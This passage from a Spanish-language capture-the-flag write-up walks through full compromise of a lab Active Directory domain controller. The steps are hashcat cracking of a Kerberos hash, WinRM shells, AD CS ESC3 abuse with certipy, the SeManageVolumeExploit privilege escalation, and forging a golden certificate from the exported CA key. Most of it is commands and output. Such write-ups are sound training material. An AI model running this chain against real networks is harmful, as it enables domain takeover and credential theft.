Lanzaremos una herramienta de cracking como `hashcat` o `john` para intentar descifrar el hash usando el diccionario `rockyou.txt`

~~~ bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt -O

$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
~~~

Hemos encontrado la contraseña, si la validamos con la herramienta `netexec`, notaremos que el usuario `lion.sk` puede conectarse al DC vía `winrm`

~~~ bash
nxc winrm DC01.certificate.htb -u 'lion.sk' -p '!QAZ2wsx'

WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\lion.sk:!QAZ2wsx (Pwn3d!)
~~~


## Shell as `Lion.SK`

Como las credenciales son válidas y el usuario `lion.sk` forma parte del grupo `Remote Management Users`, nos conectaremos a la máquina con una consola de `powershell`

~~~ bash
evil-winrm-py -i DC01.certificate.htb -u 'lion.sk' -p '!QAZ2wsx'
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC01.certificate.htb:5985 as lion.sk
evil-winrm-py PS C:\Users\Lion.SK\Documents> whoami
certificate\lion.sk
~~~

Ya podemos ver la flag del usuario sin privilegios

~~~ powershell
evil-winrm-py PS C:\Users\Lion.SK\Documents> type ..\Desktop\user.txt
02f...
~~~
<br>


# Escalada de Privilegios
---
## Abusing AD CS - `ESC3` Technique

El usuario `lion.sk` es miembro del grupo `Domain CRA Managers`, el cual parece ser un **grupo personalizado**. 

![image-center](/assets/images/posts/certificate-bloodhound.png)
{: .align-center}

Con la herramienta `certipy`, buscaremos plantillas vulnerables que podamos utilizar par explotar el servicio AD CS

~~~ bash
certipy find -u 'lion.sk' -p '!QAZ2wsx' -dc-ip 10.10.11.71 -stdout

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
...
...
...
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Certificate Request Agent
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-03T23:51:13+00:00
    Template Last Modified              : 2024-11-03T23:51:14+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Domain Users
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain Users
    [*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.
~~~

La vulnerabilidad `ESC3` aprovecha debilidades relacionadas con `Certificate Request Agents`.

> `Certificate Request Agent` (Agente de solicitud de certificados) es una **entidad o cuenta de usuario** designada para gestionar solicitudes de certificados digitales en nombre de otros usuarios o dispositivos en una infraestructura de clave pública (PKI).
{: .notice--info}

En este contexto `Delegated-CRA` posee el uso de clave extendida (`EKU`) con el valor `Certificate Request Agent`, utilizando esta plantilla podríamos generar un certificado en nombre de otros usuarios.

La explotación de `ESC3` está determinada tanto por la plantilla que incluye el EKU `Certificate Request Agent` como otra plantilla que permita la inscripción de Agentes 

~~~ bash
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
...
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA 
~~~

Solicitaremos un certificado para el usuario `lion.sk` utilizando la plantilla `Delegated-CRA`

~~~ bash
certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -ca Certificate-LTD-CA -template Delegated-CRA -dc-ip 10.10.11.71            
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
~~~

Notaremos que las plantillas que admiten autenticación (como `User`, `Machine`, `UserSignature`), se encuentran deshabilitadas. Encontraremos la plantilla `SignedUser`,  que permite autenticación

~~~ bash
Template Name                       : SignedUser
    Display Name                        : Signed User
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : True
    ...
    ...
    Extended Key Usage                  : Client Authentication
    ...
    ...
~~~

### (Failed) Certificate for `Administrator`

Si intentaremos solicitar un certificado para el usuario `Administrator` utilizando la plantilla `SignedUser`, nos saldrá un mensaje de error

~~~ bash
certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -dc-ip 10.10.11.71 -on-behalf-of 'CERTIFICATE\Administrator'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 23
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
~~~

Esto se debe a que la plantilla posee ciertos requerimientos, como que el usuario tenga asignado un `Email Subject`

~~~ bash
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
~~~

La cuenta de `Administrator` no cumple con este requerimiento, podemos consultar rápidamente utilizando la herramienta `GetADUsers.py`

~~~ bash
GetADUsers.py certificate.htb/Lion.SK:'!QAZ2wsx' -all

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Querying certificate.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2025-04-28 17:33:46.958071  2025-10-05 04:17:35.129682 
Guest                                                 <never>              <never>             
krbtgt                                                2024-11-03 04:24:32.914665  <never>             
Kai.X                 kai.x@certificate.htb           2024-11-03 19:18:06.346088  2024-11-24 01:36:30.608468 
Sara.B                sara.b@certificate.htb          2024-11-03 21:01:09.188915  2024-12-27 01:01:28.460147 
John.C                john.c@certificate.htb          2024-11-03 21:16:41.190022  <never>             
Aya.W                 aya.w@certificate.htb           2024-11-03 21:17:43.642034  <never>             
Nya.S                 nya.s@certificate.htb           2024-11-03 21:18:53.829718  <never>             
Maya.K                maya.k@certificate.htb          2024-11-03 21:20:01.657941  <never>             
Lion.SK               lion.sk@certificate.htb         2024-11-03 21:28:02.471452  2024-11-04 03:24:08.500719 
Eva.F                 eva.f@certificate.htb           2024-11-03 21:33:36.752043  <never>             
Ryan.K                ryan.k@certificate.htb          2024-11-03 21:57:30.939423  2025-10-05 03:59:38.051561 
akeder.kh                                             2024-11-23 21:26:06.813668  2024-11-23 21:51:49.735026 
kara.m                                                2024-11-23 21:28:19.142081  <never>             
Alex.D                alex.d@certificate.htb          2024-11-24 01:47:44.514001  2024-11-24 01:48:05.703180 
karol.s                                               2024-11-23 21:42:21.125611  <never>             
saad.m                saad.m@certificate.htb          2024-11-23 21:44:23.532500  <never>             
xamppuser                                             2024-12-29 04:42:04.121622  2025-10-04 19:02:17.723560 
~~~

### New User Target

Consultando los diferentes usuarios dentro del dominio, notaremos que `Ryan.K` es miembro del grupo `Domain Storage Managers`, aunque no es un grupo predeterminado, su descripción nos menciona que puede gestionar el sistema

![image-center](/assets/images/posts/certificate-bloodhound-2.png)
{: .align-center}


Intentaremos nuevamente utilizar la plantilla `SignedUser` para solicitar un certificado pero ahora para el usuario `ryan.k`

~~~ bash
certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -ca Certificate-LTD-CA -template SignedUser -pfx lion.sk.pfx -dc-ip 10.10.11.71 -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 33
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
~~~

Utilizaremos el certificado que generamos para autenticarnos en el DC como el usuario `ryan.k`, deberíamos obtener credenciales en caché además de su hash NTLM

~~~ bash
certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71 -username ryan.k -domain certificate.htb   Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
~~~


## Shell as `Ryan.K`

Podemos utilizar tanto el hash NT del usuario `ryan.k` como el ticket `kerberos`, por comodidad y para evitar errores, recomiendo utilizar el hash

~~~ bash
evil-winrm-py -i DC01.certificate.htb -u 'ryan.k' -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6'
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC01.certificate.htb:5985 as ryan.k
evil-winrm-py PS C:\Users\Ryan.K\Documents> whoami
certificate\ryan.k
~~~


## Abusing `SeManageVolumePrivilege`

Si listamos los privilegios locales que posee el usuario `ryan.k`, veremos el privilegio `SeManageVolumePrivilege`

> `SeManageVolumePrivilege` permite operaciones de administración de nivel de volumen específicas, como el volumen de bloqueo, la desfragmentación, el desmontaje del volumen y la configuración de la longitud de datos válida en Windows XP y versiones posteriores.
{: .notice--info}

~~~ bash
evil-winrm-py PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State  
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
~~~

Existe un exploit que podemos utilizar como prueba de concepto para otorgar control completo sobre todos los archivos del sistema, disponible desde el repositorio de [`CsEnox`](https://github.com/CsEnox/SeManageVolumeExploit) en `Github`.

Descargaremos el ejecutable disponible en `releases` de la siguiente manera en nuestra máquina para luego transferirla al DC

~~~ bash
# Locally
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe

# In powershell session
evil-winrm-py PS C:\Programdata> upload SeManageVolumeExploit.exe .
~~~


### Exploiting

Cuando ejecutemos el exploit, deberíamos ver el mensaje `DONE`.

~~~ powershell
evil-winrm-py PS C:\Programdata> .\SeManageVolumeExploit.exe
Entries changed: 858

DONE 
~~~

Si verificamos los permisos de la unidad `C:`, notaremos que ahora todos los usuarios del dominio tienen permisos sobre la unidad  `C:`

~~~ powershell
evil-winrm-py PS C:\Programdata> icacls C:
C: NT AUTHORITY\SYSTEM:(OI)(CI)(F)
   BUILTIN\Users:(OI)(CI)(F) # Here (F) is Full Control
   CREATOR OWNER:(OI)(CI)(IO)(F)
   BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(RX)
   BUILTIN\Pre-Windows 2000 Compatible Access:(CI)(WD,AD,WEA,WA)
~~~


## Golden Certificate

En este punto podríamos intentar desde ver la última flag hasta extraer la base de datos `NTDS` y volcar todos los hashes NTLM. 

> El ataque `Golden Certificate` consiste en obtener el **Certificado y la Clave Privada de la Autoridad de Certificación (CA)** raíz o de una CA subordinada del dominio.
{: .notice--info}

Podemos exportar un certificado que incluya la clave privada de la CA para firmar certificados en nombre de cualquier usuario, incluyendo a `Administrator`.

Comenzaremos exportando la clave privada dentro de un certificado PFX, podemos hacer uso del número de serie del certificado raíz de la CA

~~~ powershell
evil-winrm-py PS C:\Programdata> certutil -exportPFX 75B2F4BBF31F108945147B466131BDCA .\ca.pfx

MY "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file .\ca.pfx:
Enter new password: 
Confirm new password: 
CertUtil: -exportPFX command completed successfully.
~~~

Descargaremos el certificado en nuestra máquina

~~~ powershell
evil-winrm-py PS C:\Programdata> download ca.pfx .
~~~

Procederemos a utilizar el certificado para firmar otro certificado en nombre del usuario `Administrator` asignando el campo de `UPN` (`User Principal Name`)

~~~ bash
certipy forge -ca-pfx ca.pfx -upn Administrator -out golden.pfx 

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'golden.pfx'
[*] Wrote forged certificate and private key to 'golden.pfx'
~~~

Nos autenticaremos como el usuario `Administrator` empleando el certificado que emitimos anteriormente

~~~ bash
certipy auth -pfx golden.pfx -dc-ip 10.10.11.71 -username Administrator -domain certificate.htb

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d80...
~~~


## Root Time

Ya podremos conectarnos a la máquina con privilegios totales sobre el dominio

~~~ bash
evil-winrm-py -i DC01.certificate.htb -u 'Administrator' -H 'd80...' 
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC01.certificate.htb:5985 as Administrator
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
certificate\administrator
~~~

Ya podremos ver la última flag ubicada dentro del escritorio del usuario `Administrator`

~~~ powershell
evil-winrm-py PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
eb0...
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Let us revere, let us worship, but erect and open-eyed, the highest, not the lowest; the future, not the past!
> — Charlotte Gilman
{: .notice--info}
